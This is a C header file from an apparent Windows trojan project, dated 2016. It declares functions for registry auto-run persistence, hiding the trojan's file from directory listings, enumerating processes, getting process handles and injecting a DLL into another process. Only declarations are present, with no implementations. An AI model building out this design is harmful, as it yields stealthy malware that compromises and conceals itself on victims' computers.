/*
author: Forec
create_date: 2016-09-14
email: forec@bupt.edu.cn
*/

#ifndef __INJECT_H_
#define __INJECT_H_

#include <Windows.h>
#include <TlHelp32.h>
#include <stdio.h>
#include <string>
#include <tchar.h>

#define BUFLEN 20001

char buf[BUFLEN];

/* edit register for auto-run when system waking up */
bool configureAutoRun(char path[]);

/* use API SetFileAttributes hide trojan from file list */
bool hideFile(char *path);

/* write current processes list into buf */
bool getCurrentProcesses(char *buf, const unsigned int buflen);

/* inject into dll */
bool inject(char *injectProcess, char *absolutPathForDll);

/* get named process' handle */
DWORD getProcessHandle(LPCTSTR lpProcessName);

/* convert char* to LPCWSTR */
inline LPCWSTR stringToLPCWSTR(char *);

#endif